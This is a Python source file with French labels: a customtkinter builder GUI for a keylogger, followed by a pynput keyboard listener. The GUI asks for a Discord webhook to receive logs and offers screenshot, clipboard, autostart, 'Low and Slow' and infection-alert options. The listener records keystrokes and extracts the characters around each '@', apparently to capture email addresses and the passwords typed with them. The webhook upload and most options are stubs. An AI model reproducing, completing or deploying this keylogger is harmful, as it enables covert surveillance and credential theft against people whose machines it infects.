from pynput import keyboard
import sys
import time
import customtkinter as ctk
from tkinter import messagebox
import requests

historique = []
capture_apres_at = False
apres_at_buffer = []
compteur = 0



ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

def valider_webhook():
    if webhook_entry.get() == "":
        messagebox.showerror("Erreur", "Le champ du webhook ne peut pas être vide.")
        sys.exit(1)


def activity_time_option_selected():
    if activity_time_option.get() == 1:
        messagebox.showinfo("Information", "L'option 'Heure d'activité' a été sélectionnée.")
        heure = ctk.CTkToplevel(app)
        heure.geometry("400x300")
        heure.title("Configuration de l'heure d'activité")
        debut_label = ctk.CTkLabel(heure, text="Heure de début (HH:MM):", font=ctk.CTkFont(size=14))
        debut_label.pack(pady=10)
        debut_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
        debut_entry.pack(pady=10)
        fin_label = ctk.CTkLabel(heure, text="Heure de fin (HH:MM):", font=ctk.CTkFont(size=14))
        fin_label.pack(pady=10)
        fin_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
        fin_entry.pack(pady=10)
        valider_heure_btn = ctk.CTkButton(heure, text="Valider", font=ctk.CTkFont(size=14), command=heure.destroy)
        valider_heure_btn.pack(pady=20)
        if debut_entry.get() == "" or fin_entry.get() == "":
            messagebox.showerror("Erreur", "Les champs d'heure de début et de fin ne peuvent pas être vides.")
            time.sleep(2)
            heure.destroy()

def nom_keylogs():
    nom_window = ctk.CTkToplevel(app)
    nom_window.geometry("400x200")
    nom_window.title("Choix du nom du keylogs")
    nom_label = ctk.CTkLabel(nom_window, text="Entrez le nom du fichier keylogs :", font=ctk.CTkFont(size=14))
    nom_label.pack(pady=10)
    nom_entry = ctk.CTkEntry(nom_window, width=200, font=ctk.CTkFont(size=14))
    nom_entry.pack(pady=10)
    valider_nom_btn = ctk.CTkButton(nom_window, text="Valider", font=ctk.CTkFont(size=14), command=nom_window.destroy)
    valider_nom_btn.pack(pady=20)
    if nom_entry.get() == "":
        messagebox.showerror("Erreur", "Le champ du nom du fichier keylogs ne peut pas être vide.")
        time.sleep(2)
        nom_window.destroy()

def screenshot_option_func():
    messagebox.showinfo("Information", "L'option 'Capture d'écran' a été sélectionnée.")

def clipboard_option_func():
    messagebox.showinfo("Information", "L'option 'Capture du presse-papier' a été sélectionnée.")

def autostart_option_func():
    messagebox.showinfo("Information", "L'option 'Démarrage automatique' a été sélectionnée.")

def capture_before_after_at_option_func():
    messagebox.showinfo("Information", "L'option 'Capture avant @ et après' a été sélectionnée.")

def low_and_slow_option_func():
    messagebox.showinfo("Information", "L'option 'Low and Slow' a été sélectionnée.")

def alert_on_infection_option_func():
    messagebox.showinfo("Information", "L'option 'Alerte si contamination' a été sélectionnée.")
    if alert_on_infection_option.get() == 1 and webhook_entry.get() != "":
        envoyer = requests.post
        


app = ctk.CTk()
app.geometry("900x700")
app.title("Configuration du Keylogger")

titre = ctk.CTkLabel(app, text="Configuration du Keylogger", font=ctk.CTkFont(size=20, weight="bold"))
titre.pack(pady=20)

instructions = ctk.CTkLabel(app, text="Entrez le nom du webhook Discord pour envoyer les logs capturés :", font=ctk.CTkFont(size=16))
instructions.pack(pady=10)
webhook_entry = ctk.CTkEntry(app, width=400, font=ctk.CTkFont(size=14))
webhook_entry.pack(pady=10)
webhook_btn = ctk.CTkButton(app, text="Valider", font=ctk.CTkFont(size=14), command=valider_webhook)
webhook_btn.pack(pady=10)

options_label = ctk.CTkLabel(app, text="Options supplémentaires :", font=ctk.CTkFont(size=16))
options_label.pack(pady=20)

choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", font=ctk.CTkFont(size=14), command=nom_keylogs)
choix_nom.pack(pady=5)

screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran", font=ctk.CTkFont(size=14))
screenshot_option.pack(pady=5)

clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", font=ctk.CTkFont(size=14))
clipboard_option.pack(pady=5)

autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", font=ctk.CTkFont(size=14))
autostart_option.pack(pady=5)

activity_time_option = ctk.CTkCheckBox(app, text="Heure d'activité", font=ctk.CTkFont(size=14), command=activity_time_option_selected)
activity_time_option.pack(pady=5)

capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", font=ctk.CTkFont(size=14))
capture_before_after_at_option.pack(pady=5)

low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow", font=ctk.CTkFont(size=14))
low_and_slow_option.pack(pady=5)

alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", font=ctk.CTkFont(size=14))
alert_on_infection_option.pack(pady=5)

valider_keylogger_btn = ctk.CTkButton(app, text="Lancer le Keylogger", font=ctk.CTkFont(size=14), command=app.destroy)
valider_keylogger_btn.pack(pady=20)

option = ["choix du nom",
           "capture d'écran",
           "capture du presse papier",
           "démarrage automatique",
           "heure d'activité",
           "capture avant @ et apres",
           "low and slow",
           "alerte si contamination"]


app.mainloop()



def touche(key):
    global historique, capture_apres_at, apres_at_buffer, compteur

    try:
        caractere = key.char
        historique.append(caractere)

          # Si on est en phase de capture après le @
        if capture_apres_at:
            apres_at_buffer.append(caractere)
            compteur += 1

            if compteur >= 20:
                print("\n--- 20 caractères après @ ---")
                print(''.join(apres_at_buffer))
                print("--------------------------------\n")
                # Réinitialisation
                capture_apres_at = False
                apres_at_buffer = []
                compteur = 0

    except AttributeError:
        print(f"Special key {key} pressed")

        # Si la touche est @
    if hasattr(key, 'char') and key.char == '@':
        print("\n--- 16 caractères avant @ ---")
        print(''.join(historique[-30:]))  # les 30 derniers AVANT @
        print("--------------------------------")

            # Activer la capture des 20 caractères suivants
        capture_apres_at = True
        apres_at_buffer = []
        compteur = 0

    # Lancement du listener
with keyboard.Listener(on_press=touche) as listener:
    listener.join()


